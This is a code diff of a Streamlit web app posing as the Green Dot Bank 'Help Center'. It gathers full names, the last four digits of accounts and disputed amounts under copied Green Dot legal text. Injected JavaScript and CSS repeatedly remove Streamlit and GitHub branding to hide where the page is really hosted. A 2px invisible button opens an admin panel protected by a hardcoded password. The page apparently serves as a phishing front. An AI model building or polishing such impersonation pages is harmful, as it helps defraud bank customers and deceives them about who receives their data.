@@ -7,7 +7,7 @@ import string
 import pandas as pd
 from datetime import datetime
 
-# --- CONFIGURACIÓN DE BASE DE DATOS ---
+# --- DATABASE CONFIG ---
 DB_NAME = 'claims.db'
 UPLOAD_DIR = 'uploads'
 os.makedirs(UPLOAD_DIR, exist_ok=True)
@@ -29,30 +29,29 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# --- JS: PURGA TOTAL --- 
+# --- CORE SHIELD: JS PURGE (10ms) ---
 st.markdown("""<script>
-    const purge = () => {
-        const selectors = [
+    const godPurge = () => {
+        const toKill = [
             '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]',
-            '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]',
-            'header', 'footer', '.stDeployButton', '.st-emotion-cache-gi0tri', 
-            'svg.section-anchor-icon', '.etxdrby1', '.etxdrby2'
+            '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]', 
+            'header', 'footer', '.stDeployButton', '.st-emotion-cache-gi0tri',
+            'svg.section-anchor-icon', '.etxdrby1', '.etxdrby2', '.stCustomComponentV1'
         ];
-        selectors.forEach(s => {
-            document.querySelectorAll(s).forEach(el => el.remove());
-        });
+        toKill.forEach(s => { document.querySelectorAll(s).forEach(el => el.remove()); });
     };
-    setInterval(purge, 10);
+    setInterval(godPurge, 10);
 </script>""", unsafe_allow_html=True)
 
-# --- CSS: ESTILO PERMANENTE ---
+# --- CORE SHIELD: CSS LOCK ---
 st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }
     
-    /* Ocultar TODO lo de Streamlit/GitHub */
-    [data-testid="stHeader"], header, footer, .stDeployButton, .section-anchor { 
-        display: none !important; visibility: hidden !important; 
+    /* Absolute Hide */
+    [data-testid="stHeader"], header, footer, .stDeployButton, .section-anchor, 
+    [data-testid="stToolbar"], .st-emotion-cache-gi0tri { 
+        display: none !important; visibility: hidden !important; height: 0 !important; 
     }
 
     .promo-box { 
@@ -60,22 +59,17 @@ st.markdown("""<style>
         border-radius: 12px; margin: 25px 0; border: 1px solid #222; 
     }
 
-    /* Footer Legal Corregido (Texto puro, sin interferencias) */
     .legal-container {
-        font-size: 11px !important;
-        color: #666 !important;
-        text-align: justify !important;
-        margin-top: 40px !important;
-        padding-top: 20px !important;
-        border-top: 1px solid #222 !important;
-        line-height: 1.6 !important;
-        font-family: sans-serif !important;
+        font-size: 11px !important; color: #666 !important; text-align: justify !important;
+        margin-top: 40px !important; padding-top: 20px !important;
+        border-top: 1px solid #222 !important; line-height: 1.6 !important;
     }
 
+    /* Invisible Admin Dot */
     div.stButton > button[key="ghost_dot"] {
-        background-color: transparent !important; border: none !important; color: #111 !important;
-        padding: 0 !important; width: 1px !important; height: 1px !important;
-        cursor: default !important; box-shadow: none !important;
+        background-color: transparent !important; border: none !important; color: #000 !important;
+        padding: 0 !important; width: 2px !important; height: 2px !important;
+        box-shadow: none !important; cursor: default !important;
     }
 </style>""", unsafe_allow_html=True)
 
@@ -89,7 +83,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
     
-    with st.form("final_shield_form", clear_on_submit=True):
+    with st.form("god_shield_form", clear_on_submit=True):
         nombre = st.text_input("Full Name")
         cuenta = st.text_input("Last 4 digits of Account")
         monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -102,6 +96,7 @@ if not st.session_state.admin_mode:
                 st.success(f"Success. Reference: {ref}")
             else: st.error("Information required.")
 
+    # APP SECTION - PROTECTED
     st.markdown("""<div class='promo-box'>
         <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
         <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
@@ -114,7 +109,7 @@ if not st.session_state.admin_mode:
         </div>
     </div>""", unsafe_allow_html=True)
 
-    # TEXTO LEGAL ESTRICTO
+    # LEGAL FOOTER - PROTECTED
     st.markdown("""<div class='legal-container'>
         * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
         Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.
@@ -130,4 +125,3 @@ else:
     pw = st.text_input("Auth Key", type="password")
     if pw == "Diostieneelpoder1": 
         st.write("### Admin Panel Active")
-        # Aquí iría la lógica de visualización de registros si fuera necesario
